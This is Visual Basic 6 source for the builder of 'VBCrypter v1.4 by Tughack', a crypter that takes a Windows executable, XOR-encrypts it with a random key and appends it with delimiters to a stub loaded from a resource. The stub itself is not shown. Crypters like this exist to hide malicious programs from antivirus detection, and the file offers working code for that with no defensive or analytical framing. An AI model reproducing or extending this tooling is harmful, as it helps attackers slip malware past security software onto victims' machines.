VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "ComDlg32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "VBCrypter v1.4 by Tughack"
   ClientHeight    =   1455
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   5775
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   1455
   ScaleWidth      =   5775
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog dlgMain 
      Left            =   3960
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton cmdExit 
      Caption         =   "Exit"
      Height          =   375
      Left            =   4560
      TabIndex        =   5
      Top             =   960
      Width           =   1095
   End
   Begin VB.CommandButton cmdAbout 
      Caption         =   "About"
      Height          =   375
      Left            =   3360
      TabIndex        =   4
      Top             =   960
      Width           =   1095
   End
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Build"
      Enabled         =   0   'False
      Height          =   375
      Left            =   2160
      TabIndex        =   3
      Top             =   960
      Width           =   1095
   End
   Begin VB.CommandButton cmdBrowse 
      Caption         =   "..."
      Height          =   285
      Left            =   4560
      TabIndex        =   2
      Top             =   360
      Width           =   1095
   End
   Begin VB.TextBox txtFile 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Top             =   360
      Width           =   4335
   End
   Begin VB.Label lblFile 
      AutoSize        =   -1  'True
      Caption         =   "File:"
      Height          =   210
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   330
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Sub InitCommonControls Lib "comctl32" ()

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Private Sub Form_Initialize()
    If App.PrevInstance Then End
    Call InitCommonControls
End Sub

Private Sub cmdBrowse_Click()
Dim i As Integer
Dim iFileNum As Integer
Dim Buffer() As Byte
    dlgMain.Filter = "Executable Files (*.exe)|*.exe"
    dlgMain.ShowOpen
    If dlgMain.FileName <> vbNullString Then
        iFileNum = FreeFile
        Open dlgMain.FileName For Binary As #iFileNum
        ReDim Buffer(LOF(iFileNum) - 1)
        Get #iFileNum, , Buffer
        Close #iFileNum
        Call CopyMemory(IDH, Buffer(0), Len(IDH))
        If IDH.e_magic <> IMAGE_DOS_SIGNATURE Then
            MsgBox "MZ signature not found!", vbCritical
            Exit Sub
        End If
        Call CopyMemory(INH, Buffer(IDH.e_lfanew), Len(INH))
        If INH.Signature <> IMAGE_NT_SIGNATURE Then
            MsgBox "PE signature not found!", vbCritical
            Exit Sub
        End If
        txtFile.Text = dlgMain.FileName
        cmdBuild.Enabled = True
    End If
    dlgMain.FileName = vbNullString
End Sub

Private Sub cmdBuild_Click()
Dim iFileNum As Integer
Dim Buffer() As Byte
Dim sBuffer As String
Dim sKey As String
    If Dir(txtFile.Text) = vbNullString Then Exit Sub
    dlgMain.Filter = "Executable Files (*.exe)|*.exe"
    dlgMain.ShowSave
    If dlgMain.FileName <> vbNullString Then
        iFileNum = FreeFile
        Open txtFile.Text For Binary As #iFileNum
        sBuffer = Space(LOF(iFileNum))
        Get #iFileNum, , sBuffer
        Close #iFileNum
        If Dir(dlgMain.FileName) <> vbNullString Then
            Kill dlgMain.FileName
        End If
        iFileNum = FreeFile
        Open dlgMain.FileName For Binary As #iFileNum
        Buffer = LoadResData(101, "CUSTOM")
        Put #iFileNum, , Buffer
        Seek #iFileNum, LOF(iFileNum) + 1
        Randomize
        Do While Len(sKey) <> 10
            sKey = sKey & Chr(Int(Rnd * 9) + 1)
        Loop
        Put #iFileNum, , "/#/+\#\" & XOREncryption(sBuffer, sKey) & "/#/+\#\" & sKey & "/#/+\#\"
        Close #iFileNum
    End If
End Sub

Private Sub cmdAbout_Click()
    MsgBox "VBCrypter v1.4 Build Date: July 25, 2007. All rights reserved."
End Sub

Private Sub cmdExit_Click()
    End
End Sub

Private Function XOREncryption(ByVal sStr As String, ByVal sKey As String) As String
Dim i As Long
    For i = 1 To Len(sStr)
        XOREncryption = XOREncryption & Chr(Asc(Mid(sKey, IIf(i Mod Len(sKey) <> 0, i Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sStr, i, 1)))
    Next i
End Function
